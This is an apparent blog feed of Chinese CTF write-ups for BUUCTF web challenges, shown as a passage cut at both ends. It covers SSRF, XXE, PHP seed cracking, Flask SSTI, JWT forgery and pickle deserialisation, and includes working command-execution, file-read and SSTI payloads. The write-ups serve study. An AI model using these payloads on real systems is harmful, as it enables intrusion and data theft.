class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?echo%09`ls%09/`?&gt;</span><br><span class="line">&lt;?=`ls%09/`?&gt;</span><br></pre></td></tr></table></figure><p>这里绕过空格 不能用<code>$IFS$9</code> 估计是因为php会把这个<code>$</code>当作变量来解析吧 用%09绕过就行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679662047463-b38f3a26-75d5-4987-b03b-70f5bd8d9244.png" alt="img"></p><p>然后cat读出来就行了</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> php短标签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-82-[HITCON 2017]SSRFme</title>
      <link href="/post/8253ed9f.html"/>
      <url>/post/8253ed9f.html</url>
      
        <content type="html"><![CDATA[<p>[HITCON 2017]SSRFme</p><span id="more"></span><h2 id="碎碎念："><a href="#碎碎念：" class="headerlink" title="碎碎念："></a>碎碎念：</h2><p>这是一道ssrf 也就是服务器端请求伪造的题目 发现这样的题目常常会有 $_SERVER数组的应用，还是蛮不错的qwq</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>进入题目给出源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">10.244.80.206 &lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>首先第一部分if作用就是获取我们的ip</p><p>然后第二部分 根据我们的ip创建一个由md5加密的沙盒 然后选择它</p><p>第三部分 <code>shell_exec</code> 执行我们的 get到的 <code>GET+url</code>的命令</p><p>这里用到了linux中 GET命令 </p><p> GET 这个命令的一个命令执行漏洞，主要是 perl 的一个特点，在 open 可以执行命令并且还支持file协议。  </p><p><strong>注意：file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在</strong></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655020115-9c486f4f-405b-44fe-93c6-564e21e45ae2.png" alt="img"></p><p>这里以命令为文件名的文件必须加上管道符<code>|</code> 否则不行,不太明白这里为什么不加就不行</p><p>pathinfo — 返回文件路径的信息</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679654422668-fd2e7ba0-b67a-4c25-801b-efb66dd197e1.png" alt="img"></p><p>也就是创建一个我们传入filename的文件 然后选择它</p><p>file_put_contents — 将数据写入文件 </p><p>这里也就是把$data的内容写入 我们的filename的文件中</p><p>构造payload：<code>?url=file:ls /|&amp;filename=ls /|</code>  这里要执行两次才能成功 也就是提交两次  为什么要提交两次呢</p><p>因为前面说过 file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在 </p><p>然后这里为什么要加反斜杠呢 因为管道符需要我们去转义一下</p><p>因此第一次提交 是让去创建一个以命令为文件的文件  第二次才去执行并且将执行结果写入到文件中去</p><p>然后再根据我们的ip 去构造沙盒路径</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655416854-884aeaf3-67e1-4957-8fec-aecb1fef681e.png" alt="img"></p><p>构造payload访问：<code>/sandbox/2eeed2f9aeae6311b507ada8fb98809e/ls \|</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655471087-d0091932-4b56-4371-bdb7-0912c0535f48.png" alt="img"></p><p>看到有个readflag 理论来说直接执行<code>./readflag</code>就可以了 但是这里不行 我们要通过构造一个以命令为文件名的文件然后去访问 如果这里构造：<code>/readflag</code>文件是执行不了的 因为这里必须是<code>/readflag|</code> 才能成功执行 但是readflag| 不是readflag文件就算执行了也没用</p><p>再说一句 一般见到readflag这样的文件名字 直接去执行 而不是去通过cat这样的命令去读 因为readflag里面是代码 直接<code>./</code>执行就行了</p><p>构造：<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code> 也是和上面一样执行两次然后通过路径去访问就可以拿到flag了</p><p>这里用的<code>bash -c</code> 也就是将后面字符串当作命令读入执行 然后输出</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657151543-97b24931-a4a4-45ad-9f6e-2dcc37ef39d4.png" alt="img"> <img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657191148-69954b67-5aa4-4516-a440-2b628bb97fca.png" alt="img"></p><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
            <tag> perl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-74-[NCTF2019]True XML cookbook.txt</title>
      <link href="/post/e8a597ec.html"/>
      <url>/post/e8a597ec.html</url>
      
        <content type="html"><![CDATA[<p>[NCTF2019]True XML cookbook.txt</p><span id="more"></span><h2 id="碎碎念："><a href="#碎碎念：" class="headerlink" title="碎碎念："></a>碎碎念：</h2><p>这道题考察了xml和xxe，其实攻击手段手段是xxe，一开始做这道题一直没复现出来，bp爆破模块一直不动，之后用了python脚本也不行，就放弃了，第二天中午在试了一次，终于成功了，真玄学。做之前也是去补了一下xxe的知识，真不错。</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>进入题目是一个登录框，发现我们的登录名会显示在界面上</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643576603-ba19db5b-007b-446c-82f3-10ac758b00cc.png" alt="img"></p><p>之前buu有道题也是和这道题目一样的ui，直接套用上道题目的解题答案，发现肯定不行。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643711572-da9bff85-1876-406d-ad6d-69dddb2fd2f5.png" alt="img"></p><p>首先来看一下这个payload构成</p><p>第一行<code>&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot; ?&gt;</code>这一行表示了这是xml的文档显示了版本信息和编码格式</p><p>最重要的一部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE username [</span><br><span class="line">&lt;!ENTITY aaa SYSTEM &quot;file:///flag&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure><p>这是DTD，用来规范xml的文档格式 <code>username</code>为根元素 每个xml文档都要有一个根元素，并且有且只有一个，然后<code>aaa</code>是我们定义的一个实体，并且这里<code>SYSTEM</code>表示是外部实体，这也就是为什么xxe叫做外部实体注入，我们可以通过调用外部实体来达到我们预期的一个攻击手段。其实这里把他理解为是一个变量就可以之后是<code>aaa</code>这个实体的值，这里可以看到是一个file协议，没错xxe可以与伪协议一起搭配使用去恶意读一些文件内容。  具体可以看这里：<a href="https://xz.aliyun.com/t/3357#toc-0">https://xz.aliyun.com/t/3357#toc-0</a> 总结的很到位</p><p>然后通过 <code>&amp;实体名称;</code> 的方式来调用这个我们创建的实体。</p><p>然后之后就不懂了 ，慢慢的去看大佬的wp去学习</p><p>之后可以通过filter伪协议去读 index.php的内容但是没有什么用</p><p>然后这道题的思路是通过xxe去探测内网 参考：<a href="https://blog.spoock.com/2019/10/08/proc/">https://blog.spoock.com/2019/10/08/proc/</a></p><p><a href="https://www.cnblogs.com/secutity-zbk/p/14789043.html">https://www.cnblogs.com/secutity-zbk/p/14789043.html</a></p><ul><li>&#x2F;etc&#x2F;hosts 储存域名解析的缓存</li><li>&#x2F;etc&#x2F;passwd 用户密码</li><li>&#x2F;proc&#x2F;net&#x2F;arp  地址解析的内核ARP表的信息  </li><li>&#x2F;proc&#x2F;net&#x2F;fib_trie 路由缓存</li></ul><p>扫一下域名解析缓存</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644669966-630764be-85ba-49fd-ae15-4972d217180d.png" alt="img"></p><p>扫一下用户登录状态密码啥的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644749032-70eded58-fd1c-433f-b3f9-0df596e95e13.png" alt="img"></p><p>发现都可以扫到</p><p>去扫解析的地址和路由缓存：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644874065-fa187595-bd78-4376-9b6c-5f4bbd6bf4b9.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644939819-489e3110-fb7b-4962-8207-21c8754032c0.png" alt="img"></p><p>发现可疑ip，直接进行http协议读ip</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679645074091-dea2c2c1-2834-4809-a4a1-dad93bbb8423.png" alt="img"></p><p>发现不行，看了大佬的wp是因为c段ip不正确，也就是129这里不对，好像是计算机网络的知识，这里就不深究了，但是我们这里直接用bp的爆破模块就行，就是这里一开始没做出来，好像是题目问题，第二天终于做出来了</p><p>当网段正确时，拿到flag。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643489111-d7a23ddc-2bb6-46c7-b5d0-436cb2e227ee.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-73-[GWCTF 2019]枯燥的抽奖</title>
      <link href="/post/490aa04.html"/>
      <url>/post/490aa04.html</url>
      
        <content type="html"><![CDATA[<p>[GWCTF 2019]枯燥的抽奖</p><span id="more"></span><h2 id="碎碎念："><a href="#碎碎念：" class="headerlink" title="碎碎念："></a>碎碎念：</h2><p>这道题是一道关于伪造伪随机数的题目，之前从未接触过，这次来记录一下</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>进入题目之后查看源码 发现<code>check.php</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483023667-c996906b-3fbe-417a-baaa-47e01e22b92f.png" alt="img"></p><p>发现源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#x27;seed&#x27;]);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;num&#x27;]))&#123;</span><br><span class="line">    if($_POST[&#x27;num&#x27;]===$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure><p>总体分析一下就是我们要输入一个num参数 当num等于他产生的随机长为20的字符串 就能拿到flag</p><p>mt_srand() </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483191710-fb814299-27a1-4fe9-8795-4f860a7848e9.png" alt="img"></p><p>简单说就是这个函数给mt_rand()函数提供一个种子 然后mt_rand()函数去生成一个随机数，但是这个随机数其实是一个伪随机数</p><p>那么如果我们能破解出这个种子 这道题目就迎刃而解了</p><p>这里要用到php_mt_seed脚本去破解这个种子  脚本下载地址：<a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483395438-3f102fcd-eb70-4556-b7ce-21a5d383ad02.png" alt="img"></p><p>然后装到我的kali上</p><p>先make 一下</p><p>这里make一开始不知道是什么东西然后去查了查还是有东西的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483549317-739c5e85-a900-42c3-a7d6-c296871ac8be.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483489104-33b48267-83cc-452b-90ce-84b89fb3431a.png" alt="img"></p><p>然后这个脚本要先把这字符串转化为一个可识别的数列</p><p>python脚本如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">str2=&#x27;QJlBBqs6ji&#x27;</span><br><span class="line">str3 = str1[::-1]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for i in range(len(str2)):  </span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+&#x27; &#x27;+str(j)+&#x27; &#x27;+&#x27;0&#x27;+&#x27; &#x27;+str(len(str1)-1)+&#x27; &#x27;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>但是我没有搞懂这个脚本的目的和原理</p><p>进行爆破 发现种子 这里调用脚本通过<code>./</code>调用其实就是运行该脚本的意思</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483685459-9dc379c9-56ce-4f7e-a035-954752ed1f4c.png" alt="img"></p><p>再根据这个种子 重新生成题目中的字符串 直接用题目的代码稍加修改就行</p><p>脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(672026733);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483730008-bc495859-079b-47ec-b4cb-835e4a636a22.png" alt="img"></p><p>拿到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483777454-45feaed2-b77a-4171-be81-e44f5bae654d.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-72-[CSCCTF 2019 Qual]FlaskLight</title>
      <link href="/post/8df15d0e.html"/>
      <url>/post/8df15d0e.html</url>
      
        <content type="html"><![CDATA[<p>[CSCCTF 2019 Qual]FlaskLight</p><span id="more"></span><p>一眼丁真 flask的ssti</p><p>这道题几乎没怎么过滤 payload随便在网上扒就行了</p><p>但是不知道超级无敌脚本怎么会报错 只能手动去注入了</p><p>记录一下各种payload的吧 这道题如果直接用<code>__globals__</code>会报错可能是被屏蔽了，通过拼接绕过就行了</p><p>这些是比较简单的payload：</p><ol><li><code>?search=&#123;&#123;config.__init__['__global'+'s__'].os.popen("cmd").read()&#125;&#125;</code></li><li><code>?search=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cmd').read()")&#125;&#125;</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask框架 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-71-[CISCN2019 华北赛区 Day1 Web2]ikun</title>
      <link href="/post/8a6d07e1.html"/>
      <url>/post/8a6d07e1.html</url>
      
        <content type="html"><![CDATA[<p>[CISCN2019 华北赛区 Day1 Web2]ikun</p><span id="more"></span><h2 id="碎碎念："><a href="#碎碎念：" class="headerlink" title="碎碎念："></a>碎碎念：</h2><p>一道关于jwt和python反序列化的题目，对我来说很新颖，暂时只会php的反序列化，就当作学习题目了，然后越做到后面的题目发现会python脚本干一些机械重复性的事情真的很有用，得找时间去学着写脚本。</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>进入题目</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679473847087-0169d116-8a33-4976-bd55-f371017157d8.png" alt="img"></p><p>看过源码一些正常操作之后什么也没发现，看到一句话，应该是让我们买lv6，在这之前先去注册登录，然后日常看一下admin的用户，发现是已经注册过的。</p><p>一开始我都是一页一页的在找，发现找了10几页都没有找到，就感觉不对劲了，然后看了大佬的wp，发现要用脚本去找，最后page&#x3D;181，我真的人都傻了</p><p>这里放下大佬的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">for i in range(1,200):</span><br><span class="line"></span><br><span class="line">    time.sleep(0.8)</span><br><span class="line"></span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">    url = &#x27;http://ca5b02fb-d09b-45b9-b0ff-a14785826592.node3.buuoj.cn/shop?page=&#123;&#125;&#x27;.format(i)</span><br><span class="line"></span><br><span class="line">    r = requests.get(url)</span><br><span class="line"></span><br><span class="line">    if &#x27;lv6.png&#x27; in r.text:</span><br><span class="line"></span><br><span class="line">        print(&quot;找到lv6-----&#123;&#125;&quot;.format(i))</span><br><span class="line"></span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>其实这个脚本还是蛮容易理解的，将页数格式化，让后一直循环，当该页面存在<code>lv6.png</code>内容时，就说明找到了</p><p>但是这里要注意，一定让脚本暂停0.8秒，因为buu会防爬</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474702762-160ddbe0-fb42-4be9-8366-724c99159d5b.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474338539-15f8f312-2c1b-4634-a335-e851b7b615de.png" alt="img"></p><p>找到之后发现这个钱数我们买不了，抓包查看，发现有折扣</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474379880-aa279a5f-7795-4149-898f-7a5b6e3e7554.png" alt="img"></p><p>直接修改一下，发现页面跳转了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474405099-6658c1fd-c0b6-4f9a-82df-b7676aa6ea26.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474429619-3a0c3aa1-a290-4dc3-a611-ae624ea29688.png" alt="img"></p><p>只容许admin访问，这也应印证了之前注册的时候admin已经被注册过</p><p>抓包分析一下，这里就是关于jwt的知识点了，参考：<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p><p>就我个人认为，类似于我们平常做题的php session用于记录当前登录用户会话信息</p><p>那么弄明白之后就试着去伪造这个jwt，把我们的jwt伪造成admin的那么不就可以成功嘛</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474509525-bb77812e-6b29-47af-9b35-e4030eef9816.png" alt="img"></p><p>先将这个jwt字符串给 弄回原来的模样 这里有个工具：<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474884435-1df5d5ae-3d04-4797-973c-28d07ddacbbf.png" alt="img"></p><p>发现存在我们登录名称，直接改为admin，再抓包可以嘛，理论可以，但是这里还存在一个key，必须拿到这个key才能再反编译回去符合他的要求，这里就有个暴力破解jwt key的脚本 <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><p>我直接是放在kali环境下了，因为还要配置docker环境，环境配置好以后，里面有个文件说明，看看就会使用。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475165344-5aead3f4-8bbd-47b7-97e8-5e6c22972de8.png" alt="img"></p><p>注意要用root身份 爆出 key为 <code>1Kun</code> </p><p>现在将用户换为 <code>admin</code> key使用 <code>1Kun</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475274835-d6c1dca3-27df-4561-89ed-a8aec4f676ad.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475309325-035236f5-1a7f-49c8-a173-ad59fad9498c.png" alt="img"></p><p>然后查看源码 发现一个压缩包</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475357662-942c80ce-c9b9-4d58-9db6-4f749ac6cfd4.png" alt="img"></p><p>下载下来 </p><p>看了大佬的wp 发现Admin.py存在反序列化漏洞</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475402464-72d76905-3a4f-4dee-ba61-e28208f05db6.png" alt="img"></p><p>源码附上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user == &quot;admin&quot;:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&#x27;no_ass.html&#x27;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(&#x27;become&#x27;)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br></pre></td></tr></table></figure><p>这里的pickle模块应该就是属于python 的序列化与反序列化模块</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475553228-e58261a6-ee61-458f-ab34-317dd22fdd73.png" alt="img"></p><p>看到become存在反序列化 那么我们就可以像php反序列化漏洞一样 构造读flag的序列化字符串 然后传给become就可以获得flag了</p><p>本地构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):  ##当pickle对象被调用时自动执行</span><br><span class="line">       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,)) ##注意要是元组</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())  ##如果对pickle不理解可自行百度</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure><p>这里我在本机vscode会报错</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475702429-4efd6e74-e03d-49da-91a6-b059d717becd.png" alt="img"></p><p>发现这个脚本是属于python2的 我这是python3 所以我只好去我的kali虚拟去跑</p><p>注意这里要把中文注释删了 不然会报错 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475831556-3f608263-1166-4f39-a71b-dcece769b79d.png" alt="img"></p><p>然后点击 一键成为大会员 抓包 修改become值</p><p>成功拿到 flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475923738-eada5091-7c68-4503-9402-50b706cc41c3.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jwt </tag>
            
            <tag> python反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-60-[De1CTF 2019]SSRF Me</title>
      <link href="/post/2ee4794d.html"/>
      <url>/post/2ee4794d.html</url>
      
